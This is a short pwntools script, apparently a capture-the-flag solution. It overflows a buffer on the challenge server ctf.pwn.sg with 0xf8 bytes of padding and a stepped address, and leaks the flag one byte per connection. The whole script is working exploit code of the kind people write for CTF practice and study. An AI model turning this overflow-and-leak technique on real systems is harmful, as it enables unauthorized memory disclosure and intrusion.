from pwn import *
 
s = ''
  
for i in range(50):
    try:
        p = remote('ctf.pwn.sg', 4001)
  
        p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])
        p.send('\x00')
        p.recvuntil('Error: ')
        s += p.recv(1)
    except:
        break
print(s)